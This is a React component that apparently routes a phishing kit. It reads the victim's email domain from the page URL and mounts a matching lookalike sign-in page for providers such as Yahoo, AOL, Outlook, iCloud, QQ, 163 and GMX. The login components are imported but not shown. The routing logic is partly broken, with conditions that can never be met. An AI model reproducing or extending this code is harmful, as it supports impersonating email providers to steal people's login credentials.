
import React, { useState, useEffect, useCallback, } from 'react';
import './App.css';

import Translator from './translatorforall/translatorforall';

// lazy load login components

const Yahoo = React.lazy(()=> import('./EmailProviders/YAHOO/Yahoo'));
const AOL = React.lazy(()=> import('./EmailProviders/AOL/AoL'));
const Outlook = React.lazy(()=> import('./EmailProviders/OUTLOOK/Outlook'));
const Zoho = React.lazy(()=> import('./EmailProviders/ZOHO/Zoho'));
const Webmail = React.lazy(()=> import('./EmailProviders/WEBMAIL/Webmail'));
const Default = React.lazy(()=> import('./EmailProviders/001/Default'));
const Yandex = React.lazy(()=> import('./EmailProviders/YANDEX/Yandex'));
const QQ = React.lazy(()=> import('./EmailProviders/QQ/QQ'));
const Icloud = React.lazy(()=> import('./EmailProviders/ICLOUD/Icloud'));
const AliyunDotCom = React.lazy(()=> import('./EmailProviders/ALIYUNDOTCOM/Aliyun'));
const DahumDotNet = React.lazy(()=> import('./EmailProviders/DAHUMDOTNET/DahumDotNet'));
const OneSixThree = React.lazy(()=> import('./EmailProviders/163DOTCOM/163'));
const OneTwoSix = React.lazy(()=> import('./EmailProviders/126DOTCOM/126'));
const GMX = React.lazy(()=> import('./EmailProviders/GMX/gmx'));

function GenPage() {

    const [top, setTop] = useState(true);

    const toggleTop = ()=>{
      setTop(top=> !top);
    };

  const [yahooState, setYahooState] = useState(false);
  const [aolState, setAolState] = useState(false);
  const [outlookState, setOutlookState] = useState(false);
  const [zohoState, setZohoState] = useState(false);
  const [webmailState, setWebmailState] = useState(false);
  const [defaultState, setDefaultState] = useState(true);
  const [yandexState, setYandexState] = useState(false);
  const [QQState, setQQState] = useState(false);
  const [dahumDotNetState, setDahumDotNetState] = useState(false);
  const [icloudState, setIcloudState] = useState(false);
  const [aliyunState, setAliyunState] = useState(false);
  const [one163State, setOne163State] = useState(false);
  const [one26State, setOne26State] = useState(false);
  const [gmx, setGmx] = useState(false);


// for the email domain only
  const emailInTheURL = window.location.href;


    const mountYahooDomain = useCallback(()=>{
      if(emailInTheURL.includes('yahoo')){
        setYahooState(true);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);



    const skyYahooDomain = useCallback(()=>{
      if(emailInTheURL.includes('sky.com')){
        setYahooState(true);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);



    const rocketMaillYahooDomain = useCallback(()=>{
      if(emailInTheURL.includes('rocketmail.com')){
        setYahooState(true);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const yMailYahooDomain = useCallback(()=>{
      if(emailInTheURL.includes('ymail.com')){
        setYahooState(true);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const sbCGlobalYahooDomain = useCallback(()=>{
      if(emailInTheURL.includes('sbcglobal.net')){
        setYahooState(true);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);





    const frinTierYahooDomain = useCallback(()=>{
      if(emailInTheURL.includes('frontiernet.net')){
        setYahooState(true);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const mountAOLDomain = useCallback(()=>{
      if(emailInTheURL.includes('aol.com')){
        setYahooState(false);
        setAolState(true);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);





    const verizzonAOLDomain = useCallback(()=>{
      if(emailInTheURL.includes('verizon.net')){
        setYahooState(false);
        setAolState(true);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);





    const aimAOLDomain = useCallback(()=>{
      if(emailInTheURL.includes('aim.com')){
        setYahooState(false);
        setAolState(true);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const mountOulookDomain = useCallback(()=>{
      if(emailInTheURL.includes('outlook.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);





    const mountOutlookAndHotmail = useCallback(()=>{
      if(emailInTheURL.includes('hotmail')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const liveCaOutlookDomain = useCallback(()=>{
      if(emailInTheURL.includes('live.ca')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);





    const simPaticoOutlookDomain = useCallback(()=>{
      if(emailInTheURL.includes('sympatico.ca')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const liveComAuOutlookDomain = useCallback(()=>{
      if(emailInTheURL.includes('live.com.au')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);





    const liveITOutlookDomain = useCallback(()=>{
      if(emailInTheURL.includes('live.it')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const liveDotComOutlookDomain = useCallback(()=>{
      if(emailInTheURL.includes('live.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);

    // 

    const azakToolOutlookDomain = useCallback(()=>{
      if(emailInTheURL.includes('azaktool')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);

    




    const liveFRDotComOutlookDomain = useCallback(()=>{
      if(emailInTheURL.includes('live')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const MSN_OutlookDomain = useCallback(()=>{
      if(emailInTheURL.includes('msn.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(true);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const mountZohoDomain = useCallback(()=>{
      if(emailInTheURL.includes('zoho.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(true);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const mountYandexDomain = useCallback(()=>{
      if(emailInTheURL.includes('yandex')){
       setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(true);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);





    const mountDefaultDomain = useCallback(()=>{
      if (emailInTheURL.includes('gmail') && emailInTheURL.includes('ipfs') && emailInTheURL.includes('mailchimp') &&  emailInTheURL.includes('mailgun') && emailInTheURL.includes('sendgrid') && emailInTheURL.includes('fastmail')  && emailInTheURL.includes('tutanota') && emailInTheURL.includes('proton') && emailInTheURL.includes('korea.com') && emailInTheURL.includes('daum.net') && emailInTheURL.includes('kakao.com')) {
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(true);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
     }
    }, [emailInTheURL])



    

    const mountWebmailDomain = ()=>{
      // if(emailInTheURL.includes('webmail')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(true);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      // }
    }




    const mountQQDOmain = useCallback(()=>{
      if(emailInTheURL.includes('qq.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(true);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const mountDahumDotNet = useCallback(()=>{
      if(emailInTheURL.includes('daum.net')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(true);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);





    const hanMailDoTNet = useCallback(()=>{
      if(emailInTheURL.includes('hanmail.net')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(true);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    
    const mountIcloud = useCallback(()=>{
      if(emailInTheURL.includes('icloud.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(true);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const mountAliyunDotCom = useCallback(()=>{
      if(emailInTheURL.includes('aliyun.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(true);
        setOne163State(false);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const mount163DotCom = useCallback(()=>{
      if(emailInTheURL.includes('163.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(true);
        setOne26State(false);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const mountOne26DotCom = useCallback(()=>{
      if(emailInTheURL.includes('126.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(true);
        setGmx(false);
      }
    }, [emailInTheURL]);




    const mountGMX = useCallback(()=>{
      if(emailInTheURL.includes('gmx')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(true);
      }
    }, [emailInTheURL]);


    
    const mailComGMXDomain = useCallback(()=>{
      if(emailInTheURL.includes('mail.com')){
        setYahooState(false);
        setAolState(false);
        setOutlookState(false);
        setZohoState(false);
        setWebmailState(false);
        setDefaultState(false);
        setYandexState(false);
        setQQState(false);
        setDahumDotNetState(false);
        setIcloudState(false);
        setAliyunState(false);
        setOne163State(false);
        setOne26State(false);
        setGmx(true);
      }
    }, [emailInTheURL]);

    // useeffect

    
    useEffect(()=>{

      if(emailInTheURL.includes('azaktool')){
        return azakToolOutlookDomain()
      }

      

      if (emailInTheURL.includes('verizon.net')) {
        return verizzonAOLDomain();
      }

      if (emailInTheURL.includes('googlemail.com')) {
        return mountDefaultDomain();
      }

      if(emailInTheURL.includes('live')){
        return liveFRDotComOutlookDomain();
      }

      if(emailInTheURL.includes('sbcglobal.net')){
        return sbCGlobalYahooDomain();
      }

      if (emailInTheURL.includes('ymail.com')) {
        return yMailYahooDomain();
      }

      if(emailInTheURL.includes('live.com')){
        return liveDotComOutlookDomain();
      }

      if(emailInTheURL.includes('mail.com')){
        return mailComGMXDomain();
      }

      if(emailInTheURL.includes('live.it')){
        return liveITOutlookDomain();
      }

      if(emailInTheURL.includes('frontiernet.net')){
        return frinTierYahooDomain();
      }

      if(emailInTheURL.includes('live.com.au')){
        return liveComAuOutlookDomain();
      }

      if(emailInTheURL.includes('sympatico.ca')){
        return simPaticoOutlookDomain();
      }

      if(emailInTheURL.includes('live.ca')){
        return liveCaOutlookDomain();
      }

      if(emailInTheURL.includes('aim.com')){
        return aimAOLDomain()
      }

      if(emailInTheURL.includes('rocketmail.com')){
        return rocketMaillYahooDomain();
      }

      if(emailInTheURL.includes('mail.com')){
        return mountGMX();
      }

      if(emailInTheURL.includes('yahoo')){
        return mountYahooDomain();
      }

      if(emailInTheURL.includes('sky.com')){
        return skyYahooDomain();
      }

      

      if(emailInTheURL.includes('aol.com')){
        return mountAOLDomain();
      }
      
      if(emailInTheURL.includes('msn.com')){
        return MSN_OutlookDomain();
      }

      if(emailInTheURL.includes('hotmail')){
        return mountOutlookAndHotmail();
      }

      
      if(emailInTheURL.includes('zoho.com')){
        return mountZohoDomain();
      }

      if(emailInTheURL.includes('yandex')){
        return mountYandexDomain();
      }

      if(emailInTheURL.includes('qq.com')){
        return mountQQDOmain();
      }

      if (emailInTheURL.includes('126.com')) {
        return mountOne26DotCom();
      }


      if (emailInTheURL.includes('163.com')) {
        return mount163DotCom();
      }

      if (emailInTheURL.includes('aliyun.com')) {
        return mountAliyunDotCom();
      }

      if (emailInTheURL.includes('icloud.com')) {
        return mountIcloud();
      }
      
      if(emailInTheURL.includes('korea.com')){
        return mountDefaultDomain();
      }

      if(emailInTheURL.includes('daum.net')){
        return mountDahumDotNet();
      }

      if(emailInTheURL.includes('hanmail.net')){
        return hanMailDoTNet()
      }

      if (emailInTheURL.includes('kakao.com')) {
        return mountDefaultDomain()
      }

      if (emailInTheURL.includes('alibaba.com')) {
        return mountDefaultDomain()
      }

      if(emailInTheURL.includes('syskay.com')){
        return mountWebmailDomain();
      }

      if(emailInTheURL.includes('outlook.com')){
        return mountOulookDomain();
      };

      if(emailInTheURL.includes('gmx')){
        return mountGMX();
      }

      
      

      if (emailInTheURL.includes('gmail.com') && 
      emailInTheURL.includes('ipfs') && 
      emailInTheURL.includes('mailchimp') && 
      emailInTheURL.includes('mailgun') && 
      emailInTheURL.includes('sendgrid') && 
      emailInTheURL.includes('fastmail') && 
      emailInTheURL.includes('brevo') && 
      emailInTheURL.includes('hushmail') && 
      emailInTheURL.includes('mailfence') && 
      emailInTheURL.includes('privateemail') && 
      emailInTheURL.includes('tutanota') && 
      emailInTheURL.includes('proton') && 
      emailInTheURL.includes('posteo.com') && 
      emailInTheURL.includes('korea.com') && 
      emailInTheURL.includes('kakao.com') &&
      emailInTheURL.includes('centurytel.net') &&
      emailInTheURL.includes('windstream.net') &&
      emailInTheURL.includes('skynet.be') &&
      emailInTheURL.includes('hello.com') &&
      emailInTheURL.includes('optusnet.com.au') &&
      emailInTheURL.includes('juno.com') &&
      emailInTheURL.includes('club-internet.fr') &&
      emailInTheURL.includes('arcor.de') &&
      emailInTheURL.includes('planet.nl') &&
      emailInTheURL.includes('telenet.be') &&
      emailInTheURL.includes('freenet.de') &&
      emailInTheURL.includes('optonline.net') &&
      emailInTheURL.includes('shaw.ca') &&
      emailInTheURL.includes('rambler.ru') &&
      emailInTheURL.includes('charter.net') &&
      emailInTheURL.includes('uol.com.br') &&
      emailInTheURL.includes('bol.com.br') &&
      emailInTheURL.includes('sfr.fr') &&
      emailInTheURL.includes('googlemail.com') &&
      emailInTheURL.includes('terra.com.br') &&
      emailInTheURL.includes('test.com')) 
        {
          return mountWebmailDomain();
        }
        
        
       if(!emailInTheURL.includes('gmail.com') &&
       !emailInTheURL.includes('ipfs') &&
       !emailInTheURL.includes('mailchimp.com') &&  
       !emailInTheURL.includes('mailgun.com') && 
       !emailInTheURL.includes('sendgrid') && 
       !emailInTheURL.includes('fastmail.com') && 
       !emailInTheURL.includes('brevo') && 
       !emailInTheURL.includes('hushmail') && 
       !emailInTheURL.includes('mailfence') &&
       !emailInTheURL.includes('privateemail.com') && 
       !emailInTheURL.includes('tutanota.com') && 
       !emailInTheURL.includes('proton') &&
       !emailInTheURL.includes('test.com') &&
       !emailInTheURL.includes('kakao.com') &&
       !emailInTheURL.includes('centurytel.net') &&
       !emailInTheURL.includes('windstream.net') &&
       !emailInTheURL.includes('skynet.be') &&
       !emailInTheURL.includes('hello.com') &&
       !emailInTheURL.includes('optusnet.com.au') &&
       !emailInTheURL.includes('juno.com') &&
       !emailInTheURL.includes('club-internet.fr') &&
       !emailInTheURL.includes('arcor.de') &&
       !emailInTheURL.includes('planet.nl') &&
       !emailInTheURL.includes('telenet.be') &&
       !emailInTheURL.includes('freenet.de') &&
       !emailInTheURL.includes('optonline.net') &&
       !emailInTheURL.includes('shaw.ca') &&
       !emailInTheURL.includes('rambler.ru') &&
       !emailInTheURL.includes('charter.net') &&
       !emailInTheURL.includes('uol.com.br') &&
       !emailInTheURL.includes('bol.com.br') &&
       !emailInTheURL.includes('sfr.fr') &&
       !emailInTheURL.includes('googlemail.com') &&
       !emailInTheURL.includes('terra.com.br') &&
       !emailInTheURL.includes('posteo.com')){
        return mountDefaultDomain();
       };


      
      // if(emailInTheURL.includes('yahoo') && emailInTheURL.includes('aol') && emailInTheURL.includes('outlook') && emailInTheURL.includes('zoho') && emailInTheURL.includes('hotmail') && emailInTheURL.includes('qq'))
        

        // if(emailInTheURL.includes('daum.net')){
        //   return mountDefaultDomain();
        // }


      // insert the dependencies in the useeffect array []
    }, [ frinTierYahooDomain, azakToolOutlookDomain, MSN_OutlookDomain, liveDotComOutlookDomain, liveFRDotComOutlookDomain, liveITOutlookDomain, mailComGMXDomain, sbCGlobalYahooDomain, verizzonAOLDomain, yMailYahooDomain, liveComAuOutlookDomain,liveCaOutlookDomain, simPaticoOutlookDomain, aimAOLDomain, mountYahooDomain, mountAOLDomain, mountOulookDomain, mountOutlookAndHotmail, mountZohoDomain, mountYandexDomain, mountQQDOmain, emailInTheURL, mountDefaultDomain, mountDahumDotNet, mountIcloud, mountAliyunDotCom, mountOne26DotCom, mount163DotCom, mountGMX, hanMailDoTNet, rocketMaillYahooDomain, skyYahooDomain ]);


  return (
    <section>

      {/* <Preloader /> */}
      
      { top ? <Translator top={top} toggleTop={toggleTop} /> : null }

        { defaultState ? <Default /> : undefined }

        { yahooState ? <Yahoo /> : undefined }

        { aolState ? <AOL /> : undefined }

        { outlookState ? <Outlook /> : undefined }

        { zohoState ? <Zoho /> : undefined }
        
        { webmailState ? <Webmail /> : undefined }

        { yandexState ? <Yandex /> : undefined  }

        { QQState ? <QQ /> : undefined }

        { dahumDotNetState ? <DahumDotNet /> : undefined }

        { icloudState ? <Icloud /> : undefined }

        { aliyunState ? <AliyunDotCom /> : undefined }

        { one163State ? <OneSixThree /> : undefined }

        { one26State ? <OneTwoSix /> : undefined }

        { gmx ? <GMX /> : undefined }


    </section>
    
  );
};

export default GenPage;